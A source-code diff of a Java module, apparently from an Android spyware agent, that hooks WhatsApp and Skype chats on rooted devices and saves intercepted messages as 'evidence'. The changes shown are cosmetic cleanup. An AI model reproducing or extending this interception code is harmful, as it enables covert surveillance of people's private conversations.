@@ -56,19 +56,14 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 
 	private static final String TAG = "ModuleChat";
 
-	private static final int PROGRAM_WHATSAPP = 0x06;
-
-	String pObserving = "whatsapp";
-
 	SubModuleManager subModuleManager;
-
 
 	public ModuleChat() {
 		subModuleManager = new SubModuleManager(this);
 		subModuleManager.add(new ChatWhatsapp());
 		subModuleManager.add(new ChatSkype());
 	}
-	
+
 	@Override
 	protected boolean parse(ConfModule conf) {
 		if (Status.self().haveRoot()) {
@@ -96,7 +91,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (actualStart)");
 		}
-		
+
 		ListenerProcess.self().attach(this);
 	}
 
@@ -108,8 +103,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		ListenerProcess.self().detach(this);
 	}
 
-
-	public void saveEvidence( ArrayList<ChatMessage> messages) {
+	public void saveEvidence(ArrayList<ChatMessage> messages) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveEvidence)");
 		}
@@ -117,7 +111,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		final ArrayList<byte[]> items = new ArrayList<byte[]>();
 		for (ChatMessage message : messages) {
 			DateTime datetime = new DateTime(message.timestamp);
-			
+
 			// TIMESTAMP
 			items.add(datetime.getStructTm());
 			// PROGRAM_TYPE
